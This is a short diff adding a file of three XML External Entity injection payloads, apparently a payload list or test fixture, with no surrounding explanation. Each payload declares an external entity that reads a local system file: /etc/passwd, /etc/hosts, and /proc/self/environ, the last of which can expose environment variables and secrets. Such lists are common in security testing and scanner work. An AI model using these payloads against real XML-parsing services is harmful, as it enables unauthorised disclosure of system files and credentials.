@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+---
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+<foo>&xxe;</foo>
+---
+<?xml version="1.0"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
+<test>&xxe;</test>
